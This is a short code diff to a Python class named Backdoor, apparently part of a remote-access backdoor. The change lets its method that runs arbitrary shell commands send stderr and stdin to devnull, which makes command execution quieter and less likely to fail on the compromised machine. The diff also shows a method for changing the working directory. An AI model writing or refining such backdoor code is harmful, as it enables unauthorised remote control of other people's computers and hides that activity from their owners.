@@ -33,7 +33,8 @@ class Backdoor(object):
                 continue
 
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        DEVNULL = open(os.devnull, "wb")
+        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
 
     def change_working_directory(self, path):
         os.chdir(path)
